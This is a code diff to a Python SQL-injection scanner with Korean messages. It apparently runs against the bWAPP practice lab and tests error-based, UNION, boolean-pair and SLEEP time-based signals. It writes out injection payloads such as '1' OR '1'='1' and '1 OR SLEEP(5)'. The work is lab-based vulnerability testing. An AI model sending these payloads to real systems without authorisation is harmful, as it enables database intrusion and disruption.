@@ -82,7 +82,7 @@ def run_case(base_url: str, path: str, parameter: str, payload: str,
 
 def check_boolean_pair(base_url: str, path: str, parameter: str,
                         true_payload: str, false_payload: str, timeout: int = 10,
-                        session: requests.Session | None = None) -> dict:
+                        session: requests.Session | None = None, threshold: float = 0.2) -> dict:
     """신호 ③ 참/거짓 쌍: 두 페이로드의 응답을 서로 직접 비교한다(기준값과 비교하지 않음)."""
     client = session or requests
     url = f"{base_url}{path}"
@@ -90,14 +90,14 @@ def check_boolean_pair(base_url: str, path: str, parameter: str,
     true_resp = client.get(url, params={parameter: true_payload}, timeout=timeout)
     false_resp = client.get(url, params={parameter: false_payload}, timeout=timeout)
     diff_ratio = _response_diff_ratio(true_resp.text, false_resp.text)
-    boolean_signal = diff_ratio > 0.2
+    boolean_signal = diff_ratio > threshold
 
     if boolean_signal:
         rule_label = "취약 의심"
         rule_reason = f"참({true_payload!r})/거짓({false_payload!r}) 응답이 {diff_ratio:.0%} 다름(Boolean-based 의심)"
     else:
         rule_label = "양호"
-        rule_reason = "참/거짓 페이로드 응답이 비슷함(Boolean-based 신호 없음)"
+        rule_reason = f"참/거짓 페이로드 응답이 비슷함(Boolean-based 신호 없음, 차이 {diff_ratio:.1%})"
 
     return {
         "finding_id": f"SQLI-{int(time.time() * 1000)}",
@@ -203,16 +203,41 @@ def run_all(base_url: str, targets_path: str, payloads_path: str, output_path: s
 
 
 if __name__ == "__main__":
-    # --- bWAPP(bee-box) 실제 대상 검증 ---
     bwapp_base = "http://192.168.42.129/bWAPP"
-    bwapp_session = login_bwapp(bwapp_base)
+    session = login_bwapp(bwapp_base)
 
-    bwapp_result = run_case(
-        bwapp_base,
-        "/sqli_2.php?action=go",
-        "movie",
-        "1' OR '1'='1",
-        baseline_value="1",
-        session=bwapp_session,
-    )
-    print(f"[bWAPP 검증] {bwapp_result['rule_label']} - {bwapp_result['rule_reason']}")
+    print("=== 신호 ① DB 오류 노출 (GET/Select) ===")
+    try:
+        r1 = run_case(bwapp_base, "/sqli_2.php?action=go", "movie", "1' OR '1'='1",
+                      baseline_value="1", session=session)
+        print(r1["rule_label"], "-", r1["rule_reason"])
+    except requests.exceptions.RequestException as exc:
+        print("테스트 실패:", exc)
+
+    print("\n=== 신호 ② 응답 본문 차이 (GET/Search) ===")
+    try:
+        r2 = run_case(bwapp_base, "/sqli_1.php?action=search", "title",
+                      "' UNION SELECT null,null,null,null,null,null-- -",
+                      baseline_value="test123없는값", session=session)
+        print(r2["rule_label"], "-", r2["rule_reason"])
+    except requests.exceptions.RequestException as exc:
+        print("테스트 실패:", exc)
+
+    print("\n=== 신호 ③ 참/거짓 쌍 (Boolean-based) ===")
+    try:
+        r3 = check_boolean_pair(bwapp_base, "/sqli_2.php?action=go", "movie",
+                                 "1 AND 1=1", "1 AND 1=2", timeout=15, threshold=0.005, session=session)
+        print(r3["rule_label"], "-", r3["rule_reason"])
+    except requests.exceptions.RequestException as exc:
+        print("테스트 실패(직전 시간지연 테스트 여파일 수 있음, 잠시 후 재실행 권장):", exc)
+
+    print("\n=== 신호 ④ 시간 지연 (Time-based) ===")
+    try:
+        r4 = run_case(bwapp_base, "/sqli_2.php?action=go", "movie", "1 OR SLEEP(5)",
+                      baseline_value="1", timeout=20, session=session)
+        print(r4["rule_label"], "-", r4["rule_reason"], f"(응답시간={r4['elapsed_ms']}ms)")
+    except requests.exceptions.Timeout:
+        print("취약 의심 - 응답이 20초 넘게 지연되어 타임아웃 발생 (매우 강한 시간 지연 신호)")
+
+    print("\n(서버가 방금 무거운 쿼리를 처리했으니 5초 대기 후 종료합니다...)")
+    time.sleep(5)
